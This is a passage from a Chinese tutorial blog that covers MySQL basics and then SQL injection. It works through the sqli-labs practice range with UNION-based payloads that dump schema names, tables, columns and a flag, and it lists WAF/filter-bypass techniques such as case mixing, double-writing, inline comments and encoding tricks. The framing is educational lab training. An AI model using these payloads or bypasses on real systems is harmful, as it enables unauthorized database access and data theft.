class="line">-- 修改密码</span><br><span class="line">alter user &#x27;test&#x27;@&#x27;localhost&#x27; identified with mysql_native_password by &#x27;1234&#x27;;</span><br><span class="line">-- 删除用户</span><br><span class="line">drop user &#x27;test&#x27;@&#x27;localhost&#x27;;</span><br></pre></td></tr></table></figure><h5 id="注意事项-5"><a href="#注意事项-5" class="headerlink" title="注意事项"></a>注意事项</h5><ul><li>主机名可以使用 % 通配</li></ul><h4 id="权限控制"><a href="#权限控制" class="headerlink" title="权限控制"></a>权限控制</h4><p>常用权限：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732364374503-cc88c400-01e2-4e7e-92c4-3ca5beea299b.png" referrerpolicy="no-referrer"></p><p>查询权限：<br><code>SHOW GRANTS FOR &#39;用户名&#39;@&#39;主机名&#39;;</code></p><p>授予权限：<br><code>GRANT 权限列表 ON 数据库名.表名 TO &#39;用户名&#39;@&#39;主机名&#39;;</code></p><p>撤销权限：<br><code>REVOKE 权限列表 ON 数据库名.表名 FROM &#39;用户名&#39;@&#39;主机名&#39;;</code></p><h5 id="注意事项-6"><a href="#注意事项-6" class="headerlink" title="注意事项"></a>注意事项</h5><ul><li>多个权限用逗号分隔</li><li>授权时，数据库名和表名可以用 * 进行通配，代表所有</li></ul><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a><font style="color:#333">函数</font></h3><ul><li><font style="color:#333">字符串函数</font></li><li><font style="color:#333">数值函数</font></li><li><font style="color:#333">日期函数</font></li><li><font style="color:#333">流程函数</font></li></ul><h4 id="字符串函数"><a href="#字符串函数" class="headerlink" title="字符串函数"></a><font style="color:#333">字符串函数</font></h4><p><font style="color:#333">常用函数：</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732364356311-23eb5a3a-5f0c-49e9-bcb5-e315af9e5b67.png" referrerpolicy="no-referrer"></p><p><font style="color:#333">使用示例：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-- 拼接</span><br><span class="line"> SELECT CONCAT(&#x27;Hello&#x27;, &#x27;World&#x27;);</span><br><span class="line"> -- 小写</span><br><span class="line"> SELECT LOWER(&#x27;Hello&#x27;);</span><br><span class="line"> -- 大写</span><br><span class="line"> SELECT UPPER(&#x27;Hello&#x27;);</span><br><span class="line"> -- 左填充</span><br><span class="line"> SELECT LPAD(&#x27;01&#x27;, 5, &#x27;-&#x27;);</span><br><span class="line"> -- 右填充</span><br><span class="line"> SELECT RPAD(&#x27;01&#x27;, 5, &#x27;-&#x27;);</span><br><span class="line"> -- 去除空格</span><br><span class="line"> SELECT TRIM(&#x27; Hello World &#x27;);</span><br><span class="line"> -- 切片（起始索引为1）</span><br><span class="line"> SELECT SUBSTRING(&#x27;Hello World&#x27;, 1, 5);</span><br></pre></td></tr></table></figure><h4 id="数值函数"><a href="#数值函数" class="headerlink" title="数值函数"></a><font style="color:#333">数值函数</font></h4><p><font style="color:#333">常见函数：</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732364346765-1eebd62b-59ce-4293-b204-7005c1db571e.png" referrerpolicy="no-referrer"></p><h4 id="日期函数"><a href="#日期函数" class="headerlink" title="日期函数"></a><font style="color:#333">日期函数</font></h4><p><font style="color:#333">常用函数：</font></p><table><thead><tr><th align="left"><strong><font style="color:#333">函数</font></strong></th><th align="left"><strong><font style="color:#333">功能</font></strong></th></tr></thead><tbody><tr><td align="left"><font style="color:#333">CURDATE()</font></td><td align="left"><font style="color:#333">返回当前日期</font></td></tr><tr><td align="left"><font style="color:#333">CURTIME()</font></td><td align="left"><font style="color:#333">返回当前时间</font></td></tr><tr><td align="left"><font style="color:#333">NOW()</font></td><td align="left"><font style="color:#333">返回当前日期和时间</font></td></tr><tr><td align="left"><font style="color:#333">YEAR(date)</font></td><td align="left"><font style="color:#333">获取指定date的年份</font></td></tr><tr><td align="left"><font style="color:#333">MONTH(date)</font></td><td align="left"><font style="color:#333">获取指定date的月份</font></td></tr><tr><td align="left"><font style="color:#333">DAY(date)</font></td><td align="left"><font style="color:#333">获取指定date的日期</font></td></tr><tr><td align="left"><font style="color:#333">DATE_ADD(date, INTERVAL expr type)</font></td><td align="left"><font style="color:#333">返回一个日期&#x2F;时间值加上一个时间间隔expr后的时间值</font></td></tr><tr><td align="left"><font style="color:#333">DATEDIFF(date1, date2)</font></td><td align="left"><font style="color:#333">返回起始时间date1和结束时间date2之间的天数</font></td></tr></tbody></table><p><font style="color:#333">例子：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- DATE_ADD</span><br><span class="line"> SELECT DATE_ADD(NOW(), INTERVAL 70 YEAR);</span><br></pre></td></tr></table></figure><h4 id="流程函数"><a href="#流程函数" class="headerlink" title="流程函数"></a><font style="color:#333">流程函数</font></h4><p><font style="color:#333">常用函数：</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732364336894-cd4200eb-4b4a-43ff-9cd0-97c706069db5.png" referrerpolicy="no-referrer"></p><p><font style="color:#333">例子：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">select</span><br><span class="line">     name,</span><br><span class="line">     (case when age &gt; 30 then &#x27;中年&#x27; else &#x27;青年&#x27; end)</span><br><span class="line"> from employee;</span><br><span class="line"> select</span><br><span class="line">     name,</span><br><span class="line">     (case workaddress when &#x27;北京市&#x27; then &#x27;一线城市&#x27; when &#x27;上海市&#x27; then &#x27;一线城市&#x27; else &#x27;二线城市&#x27; end) as &#x27;工作地址&#x27;</span><br><span class="line"> from employee;</span><br></pre></td></tr></table></figure><h3 id="约束"><a href="#约束" class="headerlink" title="约束"></a><font style="color:#333">约束</font></h3><p><font style="color:#333">分类：</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732364323002-adb70a7c-0ab2-49d0-8a43-2c4c54bdc95f.png" referrerpolicy="no-referrer"></p><p><font style="color:#333">约束是作用于表中字段上的，可以再创建表&#x2F;修改表的时候添加约束。</font></p><h4 id="常用约束"><a href="#常用约束" class="headerlink" title="常用约束"></a><font style="color:#333">常用约束</font></h4><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732364579523-c107edc2-29af-4f67-8ab2-24f489af01c5.png" referrerpolicy="no-referrer"></p><p><strong><font style="color:#333">例子：</font></strong></p><p>create table user(<br>id int primary key auto_increment,<br>name varchar(10) not null unique,<br>age int check(age &gt; 0 and age &lt; 120),<br>status char(1) default ‘1’,<br>gender char(1)<br>);</p><h4 id="外键约束"><a href="#外键约束" class="headerlink" title="外键约束"></a><font style="color:#333">外键约束</font></h4><p><strong><font style="color:#333">添加外键：</font></strong></p><p>CREATE TABLE 表名(<br>字段名 字段类型,<br>…<br>[CONSTRAINT] [外键名称] FOREIGN KEY(外键字段名) REFERENCES 主表(主表列名)<br>);<br>ALTER TABLE 表名 ADD CONSTRAINT 外键名称 FOREIGN KEY (外键字段名) REFERENCES 主表(主表列名);</p><p>– 例子<br>alter table emp add constraint fk_emp_dept_id foreign key(dept_id) references dept(id);</p><p><strong><font style="color:#333">删除外键：</font></strong><code>&lt;font style=&quot;color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);&quot;&gt;ALTER TABLE 表名 DROP FOREIGN KEY 外键名;&lt;/font&gt;</code></p><p><strong><font style="color:#333">删除&#x2F;更新行为</font></strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732364602051-8ae41573-295c-4db6-8f99-729cee7c87ab.png" referrerpolicy="no-referrer"></p><p><font style="color:#333">更改删除&#x2F;更新行为：ALTER TABLE 表名 ADD CONSTRAINT 外键名称 FOREIGN KEY (外键字段) REFERENCES 主表名(主表字段名) ON UPDATE 行为 ON DELETE 行为;</font></p><h2 id="四、了解-MySQL-数据库中表名字段等信息的存储"><a href="#四、了解-MySQL-数据库中表名字段等信息的存储" class="headerlink" title="四、了解 MySQL 数据库中表名字段等信息的存储"></a>四、了解 MySQL 数据库中表名字段等信息的存储</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731998300640-e0899b18-abdc-4a0d-b45b-98091cba535c.png" referrerpolicy="no-referrer"></p><p>接下来以 MySQL5.7 展示各个名称的含义</p><blockquote><p>schemata</p><p>存储的是该用户创建的所有数据库的库名，要记住该表中记录数据库名的字段名为 schema_name。</p></blockquote><p>首先我们共有四个数据库</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732001396966-f850522d-a328-4c9b-bb21-ceb6ed8da4ed.png" referrerpolicy="no-referrer"></p><p>进入 SCHEMSATA 表，可见在 SCHEMA_NAME 下已经记录了这四个库名</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732001476109-70a644cc-8cd4-4d29-a3af-a17b98ca101a.png" referrerpolicy="no-referrer"></p><blockquote><p>tables</p><p>存储该用户创建的所有数据库的库名和表名，要记住该表中记录数据库 库名和表名的字段分别是 table_schema table_name.</p></blockquote><p>进入 TABLE 表，发现 TABLE_SCHEMA 和 TABLE_NAME 分别记录了所有库下的所有表名</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732001584258-6282d32c-10c9-4e24-b4f7-a6b1bbfa7d1c.png" referrerpolicy="no-referrer"></p><blockquote><p>columns</p><p>存储该用户创建的所有数据库的库名、表名、字段名，要记住该表中记录数据库库名、表名、字段名为 table_schema、table_name、column_name。</p></blockquote><p>在 COLUMNS 表下，我们可以看到更详细的信息</p><p>TABLE_SCHEMA 和 TABLE_NAME 分别记录了所有库下的所有表名及其字段名</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732001751062-1396bc34-6f41-451d-9ba7-7ab35214ba8c.png" referrerpolicy="no-referrer"></p><p><strong>理解：</strong></p><p><strong>我们正是利用 information_schema 库下的这些信息，从而知道数据库里想要的信息位置，进行渗透。</strong></p><h2 id="五、了解注入的原理及基本流程"><a href="#五、了解注入的原理及基本流程" class="headerlink" title="五、了解注入的原理及基本流程"></a>五、了解注入的原理及基本流程</h2><h3 id="1-SQL-注入的含义："><a href="#1-SQL-注入的含义：" class="headerlink" title="1.SQL 注入的含义："></a>1.SQL 注入的含义：</h3><p><strong>所谓SQL注入，就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令．当应用程序使用输入内容来构造动态sql语句以访问数据库时，会发生sql注入攻击。如果代码使用存储过程，而这些存储过程作为包含未筛选的用户输入的字符串来传递，也会发生sql注入。</strong></p><h3 id="2-SQL-注入基本本质"><a href="#2-SQL-注入基本本质" class="headerlink" title="2.SQL 注入基本本质"></a>2.SQL 注入基本本质</h3><p><font style="color:#333">把用户输入的数据当作代码来执行，违背了“数据与代码分离”的原则</font></p><h3 id="3-SQL-注入的条件"><a href="#3-SQL-注入的条件" class="headerlink" title="3.SQL 注入的条件"></a>3.SQL 注入的条件</h3><p><strong>1. 传递给后端的参数是可以控制的</strong></p><p><strong>2. 参数内容会被带入到数据库查询</strong></p><p><strong>3. 变量未存在过滤或者过滤不严谨</strong></p><h3 id="4-SQL-注入的基本流程"><a href="#4-SQL-注入的基本流程" class="headerlink" title="4.SQL 注入的基本流程"></a>4.SQL 注入的基本流程</h3><p><strong>以下内容以 sqli-labs 靶场第一关为例</strong></p><h4 id="1-找出注入点"><a href="#1-找出注入点" class="headerlink" title="1. 找出注入点"></a><font style="color:#333">1. 找出注入点</font></h4><p>题中告诉我们注入点是 ID</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732007414266-94e203a0-4583-4591-b011-667d93cf1c87.png" referrerpolicy="no-referrer"></p><p>同样我们可以通过 id&#x3D;1 和 id&#x3D;2 的回显不一致，可知道这里就是注入点</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732007529903-7e4a0686-e7eb-4d51-8363-ee73340cf6a3.png" referrerpolicy="no-referrer"><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732007549936-34a417b6-a336-42b7-8233-7444b0951804.png" referrerpolicy="no-referrer"></p><h4 id="2-判断注入及闭合类型"><a href="#2-判断注入及闭合类型" class="headerlink" title="2.判断注入及闭合类型"></a><font style="color:#333">2.判断注入及闭合类型</font></h4><ul><li><strong>数字型注入</strong></li></ul><p>以 sqli-labs 靶场第二关(数值型注入)为例</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 猜测其查询语句可能如下</span><br><span class="line"><span class="keyword">select</span> 字段 <span class="keyword">from</span> 表 <span class="keyword">where</span> id<span class="operator">=</span>$id</span><br></pre></td></tr></table></figure><ul><li><strong>字符型注入</strong></li></ul><p>以 sqli-labs 靶场第二关(数值型注入)为例</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 猜测其查询语句可能如下</span><br><span class="line"><span class="keyword">select</span> 字段 <span class="keyword">from</span> 表 <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;$id&#x27;</span></span><br></pre></td></tr></table></figure><h5 id="判断方法"><a href="#判断方法" class="headerlink" title="判断方法"></a>判断方法</h5><h6 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a><strong>方法一：</strong></h6><p>分别输入 <strong>id&#x3D;1’和 id&#x3D;1”</strong></p><ul><li><strong>情况一：都报错（为数字型注入）</strong></li></ul><p>解释：因为如果要求输入类型为数字，那么输入的 1’和 1”会被当做一个整体，会被认为是语法错误</p><ul><li><strong>情况二：id&#x3D;1’报错，id&#x3D;1”不报错</strong></li></ul><p>接着输入 id&#x3D;1’–+(在 url 里+会被编码为空格，**– **正好是 SQL 的注释语法)</p><p>或者是 id&#x3D;1’#</p><pre><code>- 结果一：不报错。（单引号闭合）
- 结果二：报错。（单引号外面可能还包着括号，输入 id=1&#39;)#试试）
</code></pre><p>（有时候可能包好几个括号，多试试）</p><ul><li><strong>情况三：id&#x3D;1’不报错，id&#x3D;1”报错</strong></li></ul><p>接着输入 id&#x3D;1”–+(在 url 里+会被编码为空格，**– **正好是 SQL 的注释语法)</p><p>或者是 id&#x3D;1”#</p><pre><code>- 结果一：不报错。（单引号闭合）
- 结果二：报错。（单引号外面可能还包着括号，输入 id=1&quot;)#试试）
</code></pre><p>（有时候可能包好几个括号，多试试）</p><h6 id="方法二：（只是判断）"><a href="#方法二：（只是判断）" class="headerlink" title="方法二：（只是判断）"></a><strong>方法二：（只是判断）</strong></h6><p>输入<strong>id&#x3D;1 and 1&#x3D;2</strong></p><ul><li><strong>如果报错就是数字型注入</strong></li></ul><p><strong>因为对于数字型而言，不仅有逻辑否，而且这就是一个错误的 SQL 语句</strong></p><ul><li><strong>如果没报错就是字符型注入</strong></li></ul><p><strong>因为对于字符型而言，输入的内容是 1 and 1&#x3D;2 这样的字符串</strong></p><p><strong>查询的 id 字段在表中应该是数字型，SQL 引擎会自动把字符串转为数字型，就是 1</strong></p><p>至于闭合类型，还要借助方法一</p><h6 id="方法三：（最简单粗暴的）"><a href="#方法三：（最简单粗暴的）" class="headerlink" title="方法三：（最简单粗暴的）"></a><strong>方法三：（最简单粗暴的）</strong></h6><p>输入 id&#x3D;1\，然后看报错信息里转义字符后面的东西，就是闭合方式</p><p>以 less3 为例，这关闭合方式是 单引号+括号闭合</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732026069059-e2308bf5-114e-4c0e-9aa1-85dd8978c530.png" referrerpolicy="no-referrer"></p><p>注意：这个方法要求有报错回显，且没有禁用转义字符</p><h4 id="3-判断表格的列数"><a href="#3-判断表格的列数" class="headerlink" title="3.判断表格的列数"></a><font style="color:#333">3.判断表格的列数</font></h4><p>如果报错就是超过列数，如果显示正常就是没有超出列数。</p><p>第一个成功，第二个失败。说明字段数为 3</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 3--+</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732013539587-6aaded20-84c5-4433-a290-5ac3c9d701c5.png" referrerpolicy="no-referrer"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 4--+</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732013607238-0b7de34f-0ca3-442a-b8dd-6160538d8237.png" referrerpolicy="no-referrer"></p><h4 id="4-判断回显的列数"><a href="#4-判断回显的列数" class="headerlink" title="4.判断回显的列数"></a><font style="color:#333">4.判断回显的列数</font></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3--+</span></span><br></pre></td></tr></table></figure><p>看到回显位为 2，3</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732015972281-5e97a676-ecad-458a-af92-3ff143ab61fa.png" referrerpolicy="no-referrer"></p><h4 id="5-爆出数据库名称"><a href="#5-爆出数据库名称" class="headerlink" title="5.爆出数据库名称"></a><font style="color:#333">5.爆出数据库名称</font></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata--+</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732015238600-3d289691-c5b3-42db-9217-15d64a17001d.png" referrerpolicy="no-referrer"></p><h4 id="6-爆出当前所属的数据库和版本"><a href="#6-爆出当前所属的数据库和版本" class="headerlink" title="6.爆出当前所属的数据库和版本"></a>6.爆出当前所属的数据库和版本</h4><p><strong>看当前再 security 库，所以之后要跨库查询</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(database(),version())--+</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732111539831-3752e9af-02c7-414d-af06-f4566d00f3c4.png" referrerpolicy="no-referrer"></p><h4 id="7-爆出表名"><a href="#7-爆出表名" class="headerlink" title="7.爆出表名"></a><font style="color:#333">7.爆出表名</font></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>ctftraining<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732015261814-1d28ce58-396d-4f52-ac22-8a6fa799c679.png" referrerpolicy="no-referrer"></p><h4 id="8-爆出列名"><a href="#8-爆出列名" class="headerlink" title="8.爆出列名"></a><font style="color:#333">8.爆出列名</font></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flag<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732015343654-e7771f23-df3e-4da8-8703-c9117ca342f5.png" referrerpolicy="no-referrer"></p><h4 id="9-查询"><a href="#9-查询" class="headerlink" title="9.查询"></a><font style="color:#333">9.查询</font></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,flag from ctftraining.flag--+</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732015525444-f95b6f59-7378-4e1b-aef3-78be2368a39f.png" referrerpolicy="no-referrer"></p><h4 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#一些<span class="keyword">SQL</span>注入常用的函数</span><br><span class="line">version()                 # 查看数据库版本</span><br><span class="line">database()                # 查看当前数据库名</span><br><span class="line"><span class="keyword">user</span>()                    # 查看当前数据库用户</span><br><span class="line"><span class="built_in">system_user</span>()             # 查看系统用户名</span><br><span class="line">group_concat()            # 把数据库中的某列数据或某几列数据合并为一个字符串</span><br><span class="line">@<span class="variable">@datadir</span>                 # 查看数据库路径</span><br><span class="line">@<span class="variable">@version_compile_os</span>      # 查看操作系统</span><br></pre></td></tr></table></figure><h2 id="六、常见的绕过方式"><a href="#六、常见的绕过方式" class="headerlink" title="六、常见的绕过方式"></a>六、常见的绕过方式</h2><h3 id="1-注释符号绕过"><a href="#1-注释符号绕过" class="headerlink" title="1.注释符号绕过"></a><font style="color:#000">1.注释符号绕过</font></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--  注释内容</span></span><br><span class="line"># 注释内容</span><br><span class="line"><span class="comment">/*注释内容*/</span></span><br><span class="line">;</span><br><span class="line">;<span class="operator">%</span><span class="number">00</span></span><br></pre></td></tr></table></figure><h3 id="2-大小写绕过"><a href="#2-大小写绕过" class="headerlink" title="2.大小写绕过"></a>2.大小写绕过</h3><p>如果用关键字阻塞过滤器显得不够聪明，可以通过变换攻击字符串中字符的大小写来避开它们，因为数据库使用不区分大小写的方式处理SOL关键字。例如，如果下列输入被阻止:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> password <span class="keyword">FROM</span> tblUsers <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure><p>可以通过下列方法绕开过滤器:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uNiOn</span> <span class="keyword">SeLeCt</span> password <span class="keyword">FrOm</span> tblUsers <span class="keyword">WhErE</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span><span class="comment">-- </span></span><br></pre></td></tr></table></figure><h3 id="3-内联注释绕过"><a href="#3-内联注释绕过" class="headerlink" title="3.内联注释绕过"></a>3.内联注释绕过</h3><p>内联注释就是把一些特有的仅在MYSQL上的语句放在 &#x2F;!..&#x2F; 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> cms_users <span class="keyword">where</span> userid<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="comment">/*!select*/</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br></pre></td></tr></table></figure><h3 id="4-双写绕过"><a href="#4-双写绕过" class="headerlink" title="4.双写绕过"></a>4.双写绕过</h3><p><font style="color:#4d4d4d">使用双写绕过。因为在过滤过程中只进行了一次替换。就是将关键字替换为对应的空。</font></p><p><font style="color:#4d4d4d">比如 union在</font><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E7%A8%8B%E5%BA%8F%E5%91%98&spm=1001.2101.3001.7020"><font style="color:#4d4d4d">程序员</font></a><font style="color:#4d4d4d">处理时被替换为空，那需要我们可以尝试把</font><font style="color:#fe2c24">union</font><font style="color:#4d4d4d">改写为</font><font style="color:#fe2c24">Ununionion</font><font style="color:#4d4d4d">，这样红</font></p><p><font style="color:#4d4d4d">色部分替换为空，则剩下的依然为union还可以</font><font style="color:#fe2c24">结合大小写</font><font style="color:#4d4d4d">过滤一起使用</font></p><h3 id="5-编码绕过"><a href="#5-编码绕过" class="headerlink" title="5.编码绕过"></a><font style="color:#000">5.编码绕过</font></h3><p><font style="color:#4d4d4d">如URLEncode编码，ASCII,HEX,unicode编码绕过：</font></p><h4 id="对关键字进行两次url全编码："><a href="#对关键字进行两次url全编码：" class="headerlink" title="对关键字进行两次url全编码："></a><strong><font style="color:#4d4d4d">对关键字进行两次url全编码：</font></strong></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">+</span><span class="keyword">and</span><span class="operator">+</span><span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br><span class="line"><span class="number">1</span><span class="operator">+</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">31</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">65</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">34</span><span class="operator">+</span><span class="number">1</span><span class="operator">=</span><span class="number">2</span> </span><br></pre></td></tr></table></figure><h4 id="ascii编码绕过"><a href="#ascii编码绕过" class="headerlink" title="ascii编码绕过"></a><strong><font style="color:#4d4d4d">ascii编码绕过</font></strong></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Test 等价于<span class="type">CHAR</span>(<span class="number">101</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">97</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">115</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">116</span>)</span><br><span class="line">#利用函数<span class="type">CHAR</span>()结合字母的ASCII码值拼接成被过滤的关键字</span><br></pre></td></tr></table></figure><h4 id="16进制绕过："><a href="#16进制绕过：" class="headerlink" title="16进制绕过："></a><font style="color:#4d4d4d">16进制绕过：</font></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> test1;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> <span class="number">0x7465737431</span>;</span><br><span class="line">#将test转化成<span class="number">16</span>进制</span><br></pre></td></tr></table></figure><h4 id="unicode编码对部分符号的绕过："><a href="#unicode编码对部分符号的绕过：" class="headerlink" title="unicode编码对部分符号的绕过："></a><font style="color:#4d4d4d">unicode编码对部分符号的绕过：</font></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">单引号<span class="operator">=</span><span class="operator">&gt;</span> <span class="operator">%</span>u0037 <span class="operator">%</span>u02b9</span><br><span class="line">空格<span class="operator">=</span><span class="operator">&gt;</span> <span class="operator">%</span>u0020 <span class="operator">%</span>uff00</span><br><span class="line">左括号<span class="operator">=</span><span class="operator">&gt;</span> <span class="operator">%</span>u0028 <span class="operator">%</span>uff08</span><br><span class="line">右括号<span class="operator">=</span><span class="operator">&gt;</span> <span class="operator">%</span>u0029 <span class="operator">%</span>uff09</span><br></pre></td></tr></table></figure><h3 id="6-大于小于号绕过"><a href="#6-大于小于号绕过" class="headerlink" title="6.&lt;&gt;大于小于号绕过"></a><font style="color:#4f4f4f">6.&lt;&gt;大于小于号绕过</font></h3><p><font style="color:#4d4d4d">在sql盲注中，一般使用大小于号来判断ascii码值的大小来达到爆破的效果。</font></p><h4 id="greatest-和least"><a href="#greatest-和least" class="headerlink" title="greatest()和least()"></a><font style="color:#4d4d4d">greatest()和least()</font></h4><p><font style="color:#4d4d4d">greatest(n1, n2, n3…):返回n中的最大值 或least(n1,n2,n3…):返回n中的最小值</font></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> cms_users <span class="keyword">where</span> userid<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> greatest(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>)),<span class="number">1</span>)<span class="operator">=</span><span class="number">99</span>;</span><br></pre></td></tr></table></figure><h4 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a><font 